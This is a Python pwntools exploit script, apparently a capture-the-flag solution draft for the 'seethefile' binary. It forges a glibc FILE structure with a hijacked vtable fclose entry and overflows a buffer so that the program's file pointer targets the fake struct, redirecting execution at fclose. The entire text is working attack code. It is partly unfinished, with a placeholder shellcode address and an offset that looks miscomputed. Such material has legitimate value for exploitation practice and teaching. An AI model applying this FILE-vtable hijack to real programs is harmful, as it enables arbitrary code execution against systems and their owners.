from pwn import *

seethefile = ELF('seethefile')
libc = ELF('libc_32.so.6')


SHELLCODE_JMP_OFFSET = 0x0
SHELLCODE_BLA_OFFSET = 0x8
VTABLE_FCLOSE_OFFSET = 0x44
LOCK_OFFSET = 0x48
SHELLCODE_OFFSET = 0x4c
VTABLE_OFFSET = 0x94

MAGICBUF_ADDR = 0x0804B0C0
SHELLCODE_ADDR = 0xaabbccdd


p = gdb.debug(
    seethefile.path,
    '''
    b *fclose+75
    c
    ''',
    env=dict(LD_PRELOAD=libc.path)
)

p.sendline('1')
p.sendline('/proc/self/fd/0')
p.sendline('2')

payload = b''

payload += p32(SHELLCODE_ADDR)

payload += b'\0' * (SHELLCODE_BLA_OFFSET - 4) + p32(SHELLCODE_ADDR)

# Override `fclose` handler.
payload += b'\0' * (VTABLE_FCLOSE_OFFSET -
                    SHELLCODE_BLA_OFFSET - 4) + p32(SHELLCODE_ADDR)

# Override `_lock`.
payload += b'\0' * (LOCK_OFFSET - VTABLE_FCLOSE_OFFSET -
                    4) + p32(MAGICBUF_ADDR)

payload += b'\0' * (SHELLCODE_OFFSET - LOCK_OFFSET - 4) + p32(MAGICBUF_ADDR)

# Override `vtable` member of the `FILE` struct.
payload += b'\0' * (VTABLE_OFFSET - LOCK_OFFSET - 4) + p32(MAGICBUF_ADDR)

# Fill buffer
payload += b'\0' * 500

p.sendline(payload)

p.sendline('5')
# Set `fp` to `magicbuf`
p.sendline(b'A' * 0x20 + p32(MAGICBUF_ADDR))


'''
   0xf7e924c2 <fclose+66>:	mov    eax,DWORD PTR [esi+0x4c]
   0xf7e924c5 <fclose+69>:	sub    esp,0x8
   0xf7e924c8 <fclose+72>:	push   0x0
   0xf7e924ca <fclose+74>:	push   esi
=> 0xf7e924cb <fclose+75>:	call   DWORD PTR [eax+0x8]
'''
